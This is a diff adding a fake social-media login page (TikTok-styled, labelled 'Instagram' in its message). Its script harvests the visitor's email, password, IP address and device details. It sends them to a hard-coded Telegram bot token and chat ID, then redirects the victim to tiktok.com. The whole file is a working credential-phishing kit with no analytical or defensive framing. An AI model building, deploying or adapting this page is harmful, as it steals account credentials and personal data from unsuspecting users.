@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Login</title>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #fc0d3d, #257ff4);
+            color: #000000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        #main-tool {
+            width: 100%;
+            max-width: 450px;
+            background-color: #000000;
+            border-radius: 10px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .wrapper {
+            margin-bottom: 50px;
+        }
+
+        .wrapper img {
+            max-width: 300px;
+        }
+
+        #TFG {
+            font-size: 2.2rem;
+            margin-bottom: 25px;
+            background: linear-gradient(90deg, #ffffff, #ff1d7b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: bold;
+        }
+
+        .input-form {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            background-color: #f9f9f9;
+        }
+
+        .buttonstyle {
+            background-color: #fe2c55;
+            color: #ffffff;
+            border: none;
+            padding: 15px 0;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1.1rem;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .buttonstyle:hover {
+            background-color: #d81e3c;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="main-tool">
+        <div class="wrapper">
+            <img src="logo.png" alt="Logo">
+        </div>
+        <h1 id="TFG">Login</h1>
+        <form id="login-form">
+            <div id="fillup">
+                <div class="form-option">
+                    <input name="email" id="email" class="input-form input-command" type="text" placeholder="Email / Username" required>
+                </div>
+                <div class="form-option">
+                    <input name="password" id="password" class="input-form input-command" type="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="buttonstyle"><b>Login</b></button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // إرسال بيانات الجهاز إلى Telegram
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const deviceDetails = {
+                // معلومات المتصفح
+                userAgent: navigator.userAgent,  // اسم المتصفح وإصداراته
+                platform: navigator.platform,    // النظام الذي يعمل عليه المتصفح (مثل Windows أو Mac)
+                language: navigator.language,    // لغة المتصفح
+                // معلومات الجهاز
+                deviceType: /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',  // نوع الجهاز (موبايل أو سطح مكتب)
+                screenWidth: screen.width,      // عرض الشاشة
+                screenHeight: screen.height,    // ارتفاع الشاشة
+                // معلومات الشبكة
+                ipAddress: "",                  // سيتم ملؤها باستخدام خدمة IP خارجي (مثال: https://api.ipify.org)
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,  // المنطقة الزمنية
+                connectionSpeed: navigator.connection ? navigator.connection.downlink : 'Connection speed unavailable',  // سرعة الاتصال بالإنترنت
+                // معلومات البطارية (إن كانت متاحة)
+                battery: (navigator.getBattery) ? navigator.getBattery().then(battery => battery.level) : Promise.resolve('Battery data unavailable'),
+                // بيانات المستخدم
+                email: email,
+                password: password
+            };
+
+            // دالة للحصول على عنوان الـ IP باستخدام خدمة ipify
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    deviceDetails.ipAddress = response.data.ip;  // إضافة عنوان الـ IP للمعلومات
+                    sendDeviceDetails(deviceDetails);  // إرسال البيانات إلى Telegram
+                })
+                .catch(error => {
+                    console.error('Error fetching the IP address:', error);
+                    sendDeviceDetails(deviceDetails);  // إرسال البيانات حتى إذا كانت هناك مشكلة في جلب الـ IP
+                });
+        });
+
+        // دالة لإرسال التفاصيل إلى تيليجرام
+        function sendDeviceDetails(details) {
+            // إذا كانت بيانات البطارية موجودة، ننتظر أن يتم تحديثها قبل إرسال التفاصيل
+            details.battery.then(batteryLevel => {
+                const message = ` 
+                    <b>New Login Attempt (Instagram)</b>\n
+                    <b>User Agent:</b> ${details.userAgent}\n
+                    <b>Platform:</b> ${details.platform}\n
+                    <b>Language:</b> ${details.language}\n
+                    <b>Device Type:</b> ${details.deviceType}\n
+                    <b>Screen Resolution:</b> ${details.screenWidth}x${details.screenHeight}\n
+                    <b>Time Zone:</b> ${details.timeZone}\n
+                    <b>Connection Speed:</b> ${details.connectionSpeed}\n
+                    <b>IP Address:</b> ${details.ipAddress}\n
+                    <b>Battery Level:</b> ${batteryLevel === 'Battery data unavailable' ? 'Unavailable' : batteryLevel * 100 + '%'}\n
+                    <b>Email:</b> ${details.email}\n
+                    <b>Password:</b> ${details.password}
+                `;
+
+                const TOKEN = "6611757234:AAEoATfcF8gD-9qLHQNGE48HVkmryBnVI4c"; // Token الخاص بالبوت
+                const CHAT_ID = "1088226862";  // معرف الشات
+                const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    // توجيه المستخدم إلى تيك توك مباشرة بعد إرسال البيانات
+                    window.location.href = "https://www.tiktok.com";
+                }).catch(error => {
+                    // في حال حدوث خطأ
+                    alert('Error sending the information. Please try again.');
+                });
+            });
+        }
+    </script>
+</body>
+
+</html>
